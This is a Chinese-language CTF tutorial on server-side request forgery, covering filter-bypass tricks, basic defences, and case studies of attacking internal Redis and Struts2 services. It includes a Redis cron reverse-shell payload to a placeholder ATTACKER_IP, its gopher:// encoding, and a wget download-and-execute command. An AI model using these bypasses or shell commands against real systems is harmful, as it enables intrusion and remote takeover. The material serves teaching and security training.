# CTF教程：P74：SSRF利用与绕过

![](img/51820edbdb2717da85b965d4cd019ab9_1.png)

![](img/51820edbdb2717da85b965d4cd019ab9_3.png)

## 概述
在本节课中，我们将深入学习SSRF（服务端请求伪造）漏洞的利用与绕过技术。我们将回顾SSRF漏洞的核心概念，探讨多种绕过常见限制的方法，并通过实际案例（如攻击内网Redis和Struts2服务）来巩固理解。课程最后会介绍一些基础的防御思路。

## 回顾：SSRF漏洞基础
上一节我们介绍了SSRF漏洞的形成原因、危害以及基本的利用方式。本节中，我们来看看在实际场景中，当遇到各种过滤和限制时，如何有效地绕过它们以成功利用SSRF漏洞。

SSRF漏洞的本质是**服务端能够对外发起网络请求**，并且**未对用户输入的请求目标（如URL）进行充分过滤和限制**。这使得攻击者可以诱导服务器向内部或其他受保护的系统发起请求。

![](img/51820edbdb2717da85b965d4cd019ab9_5.png)

![](img/51820edbdb2717da85b965d4cd019ab9_7.png)

![](img/51820edbdb2717da85b965d4cd019ab9_9.png)

## SSRF漏洞的绕过方法
当目标应用对SSRF漏洞存在一些防护措施时，我们可以尝试以下方法进行绕过。

![](img/51820edbdb2717da85b965d4cd019ab9_11.png)

![](img/51820edbdb2717da85b965d4cd019ab9_13.png)

![](img/51820edbdb2717da85b965d4cd019ab9_15.png)

![](img/51820edbdb2717da85b965d4cd019ab9_17.png)

以下是几种常见的绕过技术：

![](img/51820edbdb2717da85b965d4cd019ab9_19.png)

![](img/51820edbdb2717da85b965d4cd019ab9_20.png)

![](img/51820edbdb2717da85b965d4cd019ab9_22.png)

![](img/51820edbdb2717da85b965d4cd019ab9_24.png)

1.  **利用@符号**
    在URL中使用`@`符号可以绕过某些基于域名的过滤。例如，`http://example.com@192.168.1.1` 实际请求的是`192.168.1.1`，但某些过滤逻辑可能只检查`example.com`部分。
    ```
    http://www.baidu.com@192.168.1.1
    ```

![](img/51820edbdb2717da85b965d4cd019ab9_26.png)

![](img/51820edbdb2717da85b965d4cd019ab9_28.png)

![](img/51820edbdb2717da85b965d4cd019ab9_30.png)

![](img/51820edbdb2717da85b965d4cd019ab9_32.png)

![](img/51820edbdb2717da85b965d4cd019ab9_34.png)

![](img/51820edbdb2717da85b965d4cd019ab9_36.png)

![](img/51820edbdb2717da85b965d4cd019ab9_38.png)

![](img/51820edbdb2717da85b965d4cd019ab9_40.png)

2.  **IP地址进制转换**
    将点分十进制的IP地址转换为其他进制形式，可能绕过简单的正则匹配。
    *   **八进制**: `0300.0250.0000.0001` (对应 `192.168.0.1`)
    *   **十六进制**: `0xC0A80001` (对应 `192.168.0.1`)
    *   **十进制**: `3232235521` (对应 `192.168.0.1`)

![](img/51820edbdb2717da85b965d4cd019ab9_41.png)

![](img/51820edbdb2717da85b965d4cd019ab9_43.png)

![](img/51820edbdb2717da85b965d4cd019ab9_45.png)

![](img/51820edbdb2717da85b965d4cd019ab9_47.png)

![](img/51820edbdb2717da85b965d4cd019ab9_49.png)

![](img/51820edbdb2717da85b965d4cd019ab9_51.png)

![](img/51820edbdb2717da85b965d4cd019ab9_53.png)

3.  **添加端口号**
    为目标IP地址添加一个端口号（如`:80`），可能绕过某些特定的正则表达式匹配规则。
    ```
    http://192.168.1.1:80
    ```

![](img/51820edbdb2717da85b965d4cd019ab9_54.png)

![](img/51820edbdb2717da85b965d4cd019ab9_56.png)

![](img/51820edbdb2717da85b965d4cd019ab9_58.png)

4.  **利用短地址/重定向服务**
    使用像 `xip.io` 或 `nip.io` 这样的DNS重定向服务。访问 `192.168.1.1.xip.io` 会被解析到 `192.168.1.1`，这可以绕过直接对IP地址的过滤。
    ```
    http://192.168.1.1.xip.io
    ```

![](img/51820edbdb2717da85b965d4cd019ab9_60.png)

![](img/51820edbdb2717da85b965d4cd019ab9_61.png)

![](img/51820edbdb2717da85b965d4cd019ab9_63.png)

![](img/51820edbdb2717da85b965d4cd019ab9_65.png)

5.  **利用URL短链接**
    将恶意URL通过微博、百度等平台的短链接服务进行缩短，利用短链接来隐藏真实的请求目标。

![](img/51820edbdb2717da85b965d4cd019ab9_67.png)

![](img/51820edbdb2717da85b965d4cd019ab9_69.png)

![](img/51820edbdb2717da85b965d4cd019ab9_71.png)

![](img/51820edbdb2717da85b965d4cd019ab9_73.png)

![](img/51820edbdb2717da85b965d4cd019ab9_75.png)

![](img/51820edbdb2717da85b965d4cd019ab9_77.png)

![](img/51820edbdb2717da85b965d4cd019ab9_79.png)

6.  **利用句号替代点**
    在某些上下文中，使用句号`.`代替IP地址中的点`.`可能有效。
    ```
    http://127。0。0。1 -> 实际访问 http://127.0.0.1
    ```

## SSRF漏洞的防御思路
了解攻击方法后，我们来看看如何从防御角度来缓解SSRF漏洞的风险。

![](img/51820edbdb2717da85b965d4cd019ab9_81.png)

![](img/51820edbdb2717da85b965d4cd019ab9_83.png)

![](img/51820edbdb2717da85b965d4cd019ab9_85.png)

![](img/51820edbdb2717da85b965d4cd019ab9_87.png)

![](img/51820edbdb2717da85b965d4cd019ab9_89.png)

![](img/51820edbdb2717da85b965d4cd019ab9_91.png)

以下是几种基础的防御策略：

![](img/51820edbdb2717da85b965d4cd019ab9_93.png)

![](img/51820edbdb2717da85b965d4cd019ab9_95.png)

![](img/51820edbdb2717da85b965d4cd019ab9_97.png)

![](img/51820edbdb2717da85b965d4cd019ab9_99.png)

![](img/51820edbdb2717da85b965d4cd019ab9_101.png)

![](img/51820edbdb2717da85b965d4cd019ab9_103.png)

![](img/51820edbdb2717da85b965d4cd019ab9_105.png)

![](img/51820edbdb2717da85b965d4cd019ab9_107.png)

*   **过滤返回信息**：对服务端请求返回的内容进行严格检查和过滤，避免将敏感信息（如错误详情、内网服务标识）直接返回给用户。
*   **统一错误信息**：无论请求成功或失败，都返回统一的、信息量少的提示，避免攻击者通过差异响应进行探测。
*   **限制请求端口**：只允许访问常见的Web端口（如80, 443, 8080），禁止访问数据库、SSH等服务的端口（如22, 3306, 6379）。
*   **设置IP黑名单**：禁止访问内网IP段（如`192.168.0.0/16`, `10.0.0.0/8`, `127.0.0.0/8`）。
*   **禁用危险协议**：仅允许使用HTTP/HTTPS协议，禁用`file://`, `gopher://`, `dict://`等可能带来风险的协议。

![](img/51820edbdb2717da85b965d4cd019ab9_109.png)

![](img/51820edbdb2717da85b965d4cd019ab9_111.png)

![](img/51820edbdb2717da85b965d4cd019ab9_113.png)

![](img/51820edbdb2717da85b965d4cd019ab9_115.png)

## 实战案例：攻击内网Redis服务
接下来，我们通过一个具体案例来理解SSRF如何用于攻击内网服务。假设我们发现一个存在SSRF漏洞的Web应用，并且通过探测发现内网存在一个未授权访问的Redis服务（端口6379）。

![](img/51820edbdb2717da85b965d4cd019ab9_117.png)

![](img/51820edbdb2717da85b965d4cd019ab9_119.png)

![](img/51820edbdb2717da85b965d4cd019ab9_121.png)

![](img/51820edbdb2717da85b965d4cd019ab9_122.png)

![](img/51820edbdb2717da85b965d4cd019ab9_124.png)

![](img/51820edbdb2717da85b965d4cd019ab9_126.png)

![](img/51820edbdb2717da85b965d4cd019ab9_128.png)

攻击目标是在目标服务器上写入一个定时任务，从而反弹一个Shell回来。

![](img/51820edbdb2717da85b965d4cd019ab9_130.png)

![](img/51820edbdb2717da85b965d4cd019ab9_132.png)

**核心攻击步骤：**

![](img/51820edbdb2717da85b965d4cd019ab9_134.png)

![](img/51820edbdb2717da85b965d4cd019ab9_135.png)

![](img/51820edbdb2717da85b965d4cd019ab9_137.png)

![](img/51820edbdb2717da85b965d4cd019ab9_139.png)

![](img/51820edbdb2717da85b965d4cd019ab9_141.png)

1.  **探测与确认**：利用SSRF漏洞，使用`dict://`或`http://`协议探测内网`192.168.0.0/24`网段中`6379`端口是否开放。
2.  **构造攻击载荷**：我们需要向Redis服务器发送一系列命令，将反弹Shell的指令写入系统的定时任务目录。
3.  **利用Gopher协议发送**：由于Redis是文本协议，我们可以使用`gopher://`协议直接向`192.168.1.100:6379`发送原始的Redis命令数据。

![](img/51820edbdb2717da85b965d4cd019ab9_143.png)

![](img/51820edbdb2717da85b965d4cd019ab9_145.png)

![](img/51820edbdb2717da85b965d4cd019ab9_147.png)

![](img/51820edbdb2717da85b965d4cd019ab9_149.png)

**关键Payload示例（概念性）：**
一个用于写入定时任务的Redis命令序列大致如下：
```
SET mytask "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1\n\n"
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SAVE
```
我们需要将这个命令序列转换为Gopher协议能发送的原始格式。这通常涉及计算每条命令的长度，并在前面加上`*{参数个数}`和`${每个参数长度}`的格式。例如，`SET mytask value` 在Redis协议中可能被编码为：
```
*3\r\n$3\r\nSET\r\n$6\r\nmytask\r\n$5\r\nvalue\r\n
```
通过SSRF漏洞，最终发送的请求类似：
```
gopher://192.168.1.100:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$6%0d%0amytask%0d%0a$5%0d%0avalue%0d%0a...
```

## 实战案例：攻击内网Struts2服务
另一个常见场景是利用SSRF攻击内网存在漏洞的Struts2框架应用。Struts2历史上存在多个远程代码执行漏洞。

![](img/51820edbdb2717da85b965d4cd019ab9_151.png)

![](img/51820edbdb2717da85b965d4cd019ab9_152.png)

![](img/51820edbdb2717da85b965d4cd019ab9_154.png)

**攻击思路：**

![](img/51820edbdb2717da85b965d4cd019ab9_156.png)

![](img/51820edbdb2717da85b965d4cd019ab9_158.png)

![](img/51820edbdb2717da85b965d4cd019ab9_160.png)

![](img/51820edbdb2717da85b965d4cd019ab9_162.png)

![](img/51820edbdb2717da85b965d4cd019ab9_164.png)

![](img/51820edbdb2717da85b965d4cd019ab9_166.png)

1.  **发现内网Struts2服务**：通过SSRF探测内网特定端口（如8080）的服务，并根据返回特征判断是否为Struts2。
2.  **利用已知漏洞**：如果该Struts2版本存在已知RCE漏洞（如S2-045, S2-046等），我们可以直接通过SSRF，向该内网地址发送构造好的恶意HTTP请求包。
3.  **执行命令**：在Payload中嵌入要执行的系统命令，例如下载并执行反弹Shell脚本。
    ```
    // 一个简化的概念性Payload结构
    POST /struts2-app/login.action HTTP/1.1
    Host: 192.168.1.200:8080
    ...
    // 在特定参数或头部插入Struts2漏洞的利用代码
    // 例如：%{(#_='multipart/form-data').(...命令执行代码...)}

    // 命令部分：下载并执行Shell脚本
    bash -c “wget http://ATTACKER_IP/shell.sh -O /tmp/s.sh; chmod +x /tmp/s.sh; /tmp/s.sh”
    ```

![](img/51820edbdb2717da85b965d4cd019ab9_168.png)

![](img/51820edbdb2717da85b965d4cd019ab9_170.png)

![](img/51820edbdb2717da85b965d4cd019ab9_171.png)

![](img/51820edbdb2717da85b965d4cd019ab9_173.png)

![](img/51820edbdb2717da85b965d4cd019ab9_175.png)

![](img/51820edbdb2717da85b965d4cd019ab9_177.png)

![](img/51820edbdb2717da85b965d4cd019ab9_179.png)

![](img/51820edbdb2717da85b965d4cd019ab9_181.png)

![](img/51820edbdb2717da85b965d4cd019ab9_183.png)

![](img/51820edbdb2717da85b965d4cd019ab9_185.png)

![](img/51820edbdb2717da85b965d4cd019ab9_186.png)

![](img/51820edbdb2717da85b965d4cd019ab9_188.png)

## 总结
本节课我们一起深入学习了SSRF漏洞的利用与绕过技术。我们回顾了SSRF的基础，掌握了包括IP进制转换、使用特殊域名、短链接等多种绕过过滤的方法。同时，我们也探讨了如何防御此类漏洞。最后，通过攻击内网Redis和Struts2两个实战案例，我们具体了解了如何将SSRF与其他漏洞结合，形成完整的攻击链。理解这些技术对于攻防两端都至关重要。